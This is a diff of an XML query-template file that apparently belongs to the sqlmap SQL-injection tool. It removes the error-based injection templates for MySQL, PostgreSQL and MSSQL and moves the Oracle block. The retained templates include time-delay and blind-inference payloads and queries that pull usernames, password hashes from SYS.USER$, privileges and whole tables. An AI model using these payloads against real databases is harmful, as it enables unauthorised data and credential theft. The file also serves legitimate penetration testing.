@@ -24,7 +24,6 @@
         <timedelay query="SELECT SLEEP(%d)" query2="SELECT BENCHMARK(5000000, MD5('%d'))"/>
         <substring query="MID((%s), %d, %d)"/>
         <case query="SELECT (CASE WHEN (%s) THEN 1 ELSE 0 END)"/>
-        <error query="%s (SELECT %s FROM(SELECT COUNT(*),CONCAT(%s,(%s),%s,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)"/>
         <inference query="AND ORD(MID((%s), %d, 1)) > %d"/>
         <banner query="VERSION()"/>
         <current_user query="CURRENT_USER()"/>
@@ -74,84 +73,6 @@
         </search_column>
     </dbms>
 
-    <!-- Oracle -->
-    <dbms value="Oracle">
-        <cast query="CAST(%s AS VARCHAR(4000))"/>
-        <length query="LENGTH(%s)"/>
-        <isnull query="NVL(%s, ' ')"/>
-        <delimiter query="||"/>
-        <limit query="ROWNUM AS LIMIT %s) WHERE LIMIT"/>
-        <limitregexp query="ROWNUM\s+AS\s+.+?\s+FROM\s+.+?\)\s+WHERE\s+.+?\s*=\s*[\d]+|ROWNUM\s*=\s*[\d]+"/>
-        <limitgroupstart/>
-        <limitgroupstop/>
-        <limitstring/>
-        <order query="ORDER BY %s ASC"/>
-        <count query="COUNT(%s)"/>
-        <comment query="--"/>
-        <timedelay query="BEGIN DBMS_LOCK.SLEEP(%d); END" query2="EXEC DBMS_LOCK.SLEEP(%d.00)" query3="EXEC USER_LOCK.SLEEP(%d.00)"/>
-        <substring query="SUBSTR((%s), %d, %d)"/>
-        <case query="SELECT (CASE WHEN (%s) THEN 1 ELSE 0 END) FROM DUAL"/>
-        <error query="%s %s=(SELECT UPPER(XMLType(CHR(60)||%s||(REPLACE((%s),CHR(32),CHR(58)||CHR(95)||CHR(58)))||%s||CHR(62))) FROM DUAL)"/>
-        <inference query="AND ASCII(SUBSTR((%s), %d, 1)) > %d"/>
-        <banner query="SELECT banner FROM v$version WHERE ROWNUM=1"/>
-        <current_user query="SELECT USER FROM DUAL"/>
-        <current_db query="SELECT SYS.DATABASE_NAME FROM DUAL"/>
-        <!--
-             NOTE: in Oracle to check if the session user is DBA you can use:
-             SELECT USERENV('ISDBA') FROM DUAL
-        -->
-        <is_dba query="(SELECT GRANTED_ROLE FROM DBA_ROLE_PRIVS WHERE GRANTEE=USER AND GRANTED_ROLE='DBA')='DBA'"/>
-        <users>
-            <inband query="SELECT USERNAME FROM SYS.ALL_USERS ORDER BY 1"/>
-            <blind query="SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=%d" count="SELECT COUNT(DISTINCT(USERNAME)) FROM SYS.ALL_USERS"/>
-        </users>
-        <passwords>
-            <inband query="SELECT NAME, PASSWORD FROM SYS.USER$" condition="NAME"/>
-            <blind query="SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$ WHERE NAME='%s') WHERE LIMIT=%d" count="SELECT COUNT(DISTINCT(PASSWORD)) FROM SYS.USER$ WHERE NAME='%s'"/>
-        </passwords>
-        <!--
-             NOTE: in Oracle to enumerate the privileges for the session user you can use:
-             SELECT * FROM SESSION_PRIVS
-        -->
-        <privileges>
-            <inband query="SELECT GRANTEE, PRIVILEGE FROM DBA_SYS_PRIVS" query2="SELECT USERNAME, PRIVILEGE FROM USER_SYS_PRIVS" condition="GRANTEE" condition2="USERNAME"/>
-            <blind query="SELECT DISTINCT(PRIVILEGE) FROM (SELECT DISTINCT(PRIVILEGE), ROWNUM AS LIMIT FROM DBA_SYS_PRIVS WHERE GRANTEE='%s') WHERE LIMIT=%d" query2="SELECT DISTINCT(PRIVILEGE) FROM (SELECT DISTINCT(PRIVILEGE), ROWNUM AS LIMIT FROM USER_SYS_PRIVS WHERE USERNAME='%s') WHERE LIMIT=%d" count="SELECT COUNT(DISTINCT(PRIVILEGE)) FROM DBA_SYS_PRIVS WHERE GRANTEE='%s'" count2="SELECT COUNT(DISTINCT(PRIVILEGE)) FROM USER_SYS_PRIVS WHERE USERNAME='%s'"/>
-        </privileges>
-        <!--
-             NOTE: in Oracle to enumerate the roles for the session user you can use:
-             SELECT * FROM SESSION_ROLES
-        -->
-        <roles>
-            <inband query="SELECT GRANTEE, GRANTED_ROLE FROM DBA_ROLE_PRIVS" query2="SELECT USERNAME, GRANTED_ROLE FROM USER_ROLE_PRIVS" condition="GRANTEE" condition2="USERNAME"/>
-            <blind query="SELECT DISTINCT(GRANTED_ROLE) FROM (SELECT DISTINCT(GRANTED_ROLE), ROWNUM AS LIMIT FROM DBA_ROLE_PRIVS WHERE GRANTEE='%s') WHERE LIMIT=%d" query2="SELECT DISTINCT(GRANTED_ROLE) FROM (SELECT DISTINCT(GRANTED_ROLE), ROWNUM AS LIMIT FROM USER_ROLE_PRIVS WHERE USERNAME='%s') WHERE LIMIT=%d" count="SELECT COUNT(DISTINCT(GRANTED_ROLE)) FROM DBA_ROLE_PRIVS WHERE GRANTEE='%s'" count2="SELECT COUNT(DISTINCT(GRANTED_ROLE)) FROM USER_ROLE_PRIVS WHERE USERNAME='%s'"/>
-        </roles>
-        <!-- NOTE: in Oracle there is no query to enumerate DBMS databases. It is possible only through a STATUS request to the Oracle TNS Listener negotiating its protocol -->
-        <dbs/>
-        <tables>
-            <!-- NOTE: in Oracle the TABLESPACE_NAME is the spacename corresponding to SYS, SYSDBA, USERS. It is NOT the database name -->
-            <inband query="SELECT TABLESPACE_NAME, TABLE_NAME FROM SYS.ALL_TABLES" condition="TABLESPACE_NAME"/>
-            <blind query="SELECT TABLE_NAME FROM (SELECT TABLE_NAME, ROWNUM AS LIMIT FROM SYS.ALL_TABLES WHERE TABLESPACE_NAME='%s') WHERE LIMIT=%d" count="SELECT COUNT(TABLE_NAME) FROM SYS.ALL_TABLES WHERE TABLESPACE_NAME='%s'"/>
-        </tables>
-        <columns>
-            <inband query="SELECT COLUMN_NAME, DATA_TYPE FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='%s'" condition="COLUMN_NAME"/>
-            <blind query="SELECT COLUMN_NAME FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='%s'" query2="SELECT DATA_TYPE FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='%s' AND COLUMN_NAME='%s'" count="SELECT COUNT(COLUMN_NAME) FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='%s'" condition="COLUMN_NAME"/>
-        </columns>
-        <dump_table>
-            <inband query="SELECT %s FROM %s"/>
-            <blind query="SELECT %s FROM (SELECT %s, ROWNUM AS LIMIT FROM %s) WHERE LIMIT=%d" count="SELECT COUNT(*) FROM %s"/>
-        </dump_table>
-        <search_db/>
-        <search_table>
-            <!-- NOTE: in Oracle the TABLESPACE_NAME is the spacename corresponding to SYS, SYSDBA, USERS. It is NOT the database name -->
-            <inband query="SELECT TABLESPACE_NAME, TABLE_NAME FROM SYS.ALL_TABLES WHERE " condition="TABLE_NAME" condition2="TABLESPACE_NAME"/>
-            <blind query="SELECT DISTINCT(TABLESPACE_NAME) FROM SYS.ALL_TABLES WHERE " query2="SELECT TABLE_NAME FROM SYS.ALL_TABLES WHERE TABLESPACE_NAME='%s'" count="SELECT COUNT(DISTINCT(TABLESPACE_NAME)) FROM SYS.ALL_TABLES WHERE " count2="SELECT COUNT(TABLE_NAME) FROM SYS.ALL_TABLES WHERE TABLESPACE_NAME='%s'" condition="TABLE_NAME" condition2="TABLESPACE_NAME"/>
-        </search_table>
-        <search_column>
-            <inband query="SELECT TABLE_NAME FROM SYS.ALL_TAB_COLUMNS WHERE " condition="COLUMN_NAME"/>
-            <blind query="" query2="SELECT DISTINCT(TABLE_NAME) FROM SYS.ALL_TAB_COLUMNS" count="" count2="SELECT COUNT(DISTINCT(TABLE_NAME)) FROM SYS.ALL_TAB_COLUMNS" condition="COLUMN_NAME"/>
-        </search_column>
-    </dbms>
-
     <!-- PostgreSQL -->
     <dbms value="PostgreSQL">
         <cast query="CAST(%s AS CHARACTER(10000))"/>
@@ -175,7 +96,6 @@
         <timedelay query="SELECT PG_SLEEP(%d)" query2="SELECT 'sqlmap' WHERE exists(SELECT * FROM generate_series(1, 300000%d))" query3="CREATE OR REPLACE FUNCTION sleep(int) RETURNS int AS '/lib/libc.so.6', 'sleep' language 'C' STRICT; SELECT sleep(%d)"/>
         <substring query="SUBSTR((%s)::text, %d, %d)"/>
         <case query="SELECT (CASE WHEN (%s) THEN 1 ELSE 0 END)"/>
-        <error query="%s %s=CAST(%s||(%s)::text||%s AS NUMERIC)"/>
         <inference query="AND ASCII(SUBSTR((%s)::text, %d, 1)) > %d"/>
         <banner query="SELECT VERSION()"/>
         <current_user query="SELECT CURRENT_USER"/>
@@ -242,7 +162,6 @@
         <timedelay query="WAITFOR DELAY '0:0:%d'"/>
         <substring query="SUBSTRING((%s), %d, %d)"/>
         <case query="SELECT (CASE WHEN (%s) THEN '1' ELSE '0' END)"/>
-        <error query="%s %s=CONVERT(INT,(%s+(%s)+%s))"/>
         <inference query="AND ASCII(SUBSTRING((%s), %d, 1)) > %d"/>
         <banner query="SELECT @@VERSION"/>
         <current_user query="SELECT SYSTEM_USER"/>
@@ -287,6 +206,83 @@
         <search_column>
             <inband query="SELECT %s..sysobjects.name FROM %s..syscolumns, %s..sysobjects WHERE %s..syscolumns.id=%s..sysobjects.id" condition="[DB]..syscolumns.name"/>
             <blind query="" query2="SELECT %s..sysobjects.name FROM %s..syscolumns, %s..sysobjects WHERE %s..syscolumns.id=%s..sysobjects.id" count="" count2="SELECT COUNT(%s..sysobjects.name) FROM %s..syscolumns, %s..sysobjects WHERE %s..syscolumns.id=%s..sysobjects.id" condition="[DB]..syscolumns.name"/>
+        </search_column>
+    </dbms>
+
+    <!-- Oracle -->
+    <dbms value="Oracle">
+        <cast query="CAST(%s AS VARCHAR(4000))"/>
+        <length query="LENGTH(%s)"/>
+        <isnull query="NVL(%s, ' ')"/>
+        <delimiter query="||"/>
+        <limit query="ROWNUM AS LIMIT %s) WHERE LIMIT"/>
+        <limitregexp query="ROWNUM\s+AS\s+.+?\s+FROM\s+.+?\)\s+WHERE\s+.+?\s*=\s*[\d]+|ROWNUM\s*=\s*[\d]+"/>
+        <limitgroupstart/>
+        <limitgroupstop/>
+        <limitstring/>
+        <order query="ORDER BY %s ASC"/>
+        <count query="COUNT(%s)"/>
+        <comment query="--"/>
+        <timedelay query="BEGIN DBMS_LOCK.SLEEP(%d); END" query2="EXEC DBMS_LOCK.SLEEP(%d.00)" query3="EXEC USER_LOCK.SLEEP(%d.00)"/>
+        <substring query="SUBSTR((%s), %d, %d)"/>
+        <case query="SELECT (CASE WHEN (%s) THEN 1 ELSE 0 END) FROM DUAL"/>
+        <inference query="AND ASCII(SUBSTR((%s), %d, 1)) > %d"/>
+        <banner query="SELECT banner FROM v$version WHERE ROWNUM=1"/>
+        <current_user query="SELECT USER FROM DUAL"/>
+        <current_db query="SELECT SYS.DATABASE_NAME FROM DUAL"/>
+        <!--
+             NOTE: in Oracle to check if the session user is DBA you can use:
+             SELECT USERENV('ISDBA') FROM DUAL
+        -->
+        <is_dba query="(SELECT GRANTED_ROLE FROM DBA_ROLE_PRIVS WHERE GRANTEE=USER AND GRANTED_ROLE='DBA')='DBA'"/>
+        <users>
+            <inband query="SELECT USERNAME FROM SYS.ALL_USERS ORDER BY 1"/>
+            <blind query="SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=%d" count="SELECT COUNT(DISTINCT(USERNAME)) FROM SYS.ALL_USERS"/>
+        </users>
+        <passwords>
+            <inband query="SELECT NAME, PASSWORD FROM SYS.USER$" condition="NAME"/>
+            <blind query="SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$ WHERE NAME='%s') WHERE LIMIT=%d" count="SELECT COUNT(DISTINCT(PASSWORD)) FROM SYS.USER$ WHERE NAME='%s'"/>
+        </passwords>
+        <!--
+             NOTE: in Oracle to enumerate the privileges for the session user you can use:
+             SELECT * FROM SESSION_PRIVS
+        -->
+        <privileges>
+            <inband query="SELECT GRANTEE, PRIVILEGE FROM DBA_SYS_PRIVS" query2="SELECT USERNAME, PRIVILEGE FROM USER_SYS_PRIVS" condition="GRANTEE" condition2="USERNAME"/>
+            <blind query="SELECT DISTINCT(PRIVILEGE) FROM (SELECT DISTINCT(PRIVILEGE), ROWNUM AS LIMIT FROM DBA_SYS_PRIVS WHERE GRANTEE='%s') WHERE LIMIT=%d" query2="SELECT DISTINCT(PRIVILEGE) FROM (SELECT DISTINCT(PRIVILEGE), ROWNUM AS LIMIT FROM USER_SYS_PRIVS WHERE USERNAME='%s') WHERE LIMIT=%d" count="SELECT COUNT(DISTINCT(PRIVILEGE)) FROM DBA_SYS_PRIVS WHERE GRANTEE='%s'" count2="SELECT COUNT(DISTINCT(PRIVILEGE)) FROM USER_SYS_PRIVS WHERE USERNAME='%s'"/>
+        </privileges>
+        <!--
+             NOTE: in Oracle to enumerate the roles for the session user you can use:
+             SELECT * FROM SESSION_ROLES
+        -->
+        <roles>
+            <inband query="SELECT GRANTEE, GRANTED_ROLE FROM DBA_ROLE_PRIVS" query2="SELECT USERNAME, GRANTED_ROLE FROM USER_ROLE_PRIVS" condition="GRANTEE" condition2="USERNAME"/>
+            <blind query="SELECT DISTINCT(GRANTED_ROLE) FROM (SELECT DISTINCT(GRANTED_ROLE), ROWNUM AS LIMIT FROM DBA_ROLE_PRIVS WHERE GRANTEE='%s') WHERE LIMIT=%d" query2="SELECT DISTINCT(GRANTED_ROLE) FROM (SELECT DISTINCT(GRANTED_ROLE), ROWNUM AS LIMIT FROM USER_ROLE_PRIVS WHERE USERNAME='%s') WHERE LIMIT=%d" count="SELECT COUNT(DISTINCT(GRANTED_ROLE)) FROM DBA_ROLE_PRIVS WHERE GRANTEE='%s'" count2="SELECT COUNT(DISTINCT(GRANTED_ROLE)) FROM USER_ROLE_PRIVS WHERE USERNAME='%s'"/>
+        </roles>
+        <!-- NOTE: in Oracle there is no query to enumerate DBMS databases. It is possible only through a STATUS request to the Oracle TNS Listener negotiating its protocol -->
+        <dbs/>
+        <tables>
+            <!-- NOTE: in Oracle the TABLESPACE_NAME is the spacename corresponding to SYS, SYSDBA, USERS. It is NOT the database name -->
+            <inband query="SELECT TABLESPACE_NAME, TABLE_NAME FROM SYS.ALL_TABLES" condition="TABLESPACE_NAME"/>
+            <blind query="SELECT TABLE_NAME FROM (SELECT TABLE_NAME, ROWNUM AS LIMIT FROM SYS.ALL_TABLES WHERE TABLESPACE_NAME='%s') WHERE LIMIT=%d" count="SELECT COUNT(TABLE_NAME) FROM SYS.ALL_TABLES WHERE TABLESPACE_NAME='%s'"/>
+        </tables>
+        <columns>
+            <inband query="SELECT COLUMN_NAME, DATA_TYPE FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='%s'" condition="COLUMN_NAME"/>
+            <blind query="SELECT COLUMN_NAME FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='%s'" query2="SELECT DATA_TYPE FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='%s' AND COLUMN_NAME='%s'" count="SELECT COUNT(COLUMN_NAME) FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='%s'" condition="COLUMN_NAME"/>
+        </columns>
+        <dump_table>
+            <inband query="SELECT %s FROM %s"/>
+            <blind query="SELECT %s FROM (SELECT %s, ROWNUM AS LIMIT FROM %s) WHERE LIMIT=%d" count="SELECT COUNT(*) FROM %s"/>
+        </dump_table>
+        <search_db/>
+        <search_table>
+            <!-- NOTE: in Oracle the TABLESPACE_NAME is the spacename corresponding to SYS, SYSDBA, USERS. It is NOT the database name -->
+            <inband query="SELECT TABLESPACE_NAME, TABLE_NAME FROM SYS.ALL_TABLES WHERE " condition="TABLE_NAME" condition2="TABLESPACE_NAME"/>
+            <blind query="SELECT DISTINCT(TABLESPACE_NAME) FROM SYS.ALL_TABLES WHERE " query2="SELECT TABLE_NAME FROM SYS.ALL_TABLES WHERE TABLESPACE_NAME='%s'" count="SELECT COUNT(DISTINCT(TABLESPACE_NAME)) FROM SYS.ALL_TABLES WHERE " count2="SELECT COUNT(TABLE_NAME) FROM SYS.ALL_TABLES WHERE TABLESPACE_NAME='%s'" condition="TABLE_NAME" condition2="TABLESPACE_NAME"/>
+        </search_table>
+        <search_column>
+            <inband query="SELECT TABLE_NAME FROM SYS.ALL_TAB_COLUMNS WHERE " condition="COLUMN_NAME"/>
+            <blind query="" query2="SELECT DISTINCT(TABLE_NAME) FROM SYS.ALL_TAB_COLUMNS" count="" count2="SELECT COUNT(DISTINCT(TABLE_NAME)) FROM SYS.ALL_TAB_COLUMNS" condition="COLUMN_NAME"/>
         </search_column>
     </dbms>
 
@@ -477,7 +473,6 @@
         <timedelay query="WAITFOR DELAY '0:0:%d'"/>
         <substring query="SUBSTRING((%s), %d, %d)"/>
         <case query="SELECT (CASE WHEN (%s) THEN '1' ELSE '0' END)"/>
-        <error query="%s %s=CONVERT(INT,(%s+(%s)+%s))"/>
         <inference query="AND ASCII(SUBSTRING((%s), %d, 1)) > %d"/>
         <banner query="SELECT @@VERSION"/>
         <current_user query="SELECT SUSER_NAME()"/>
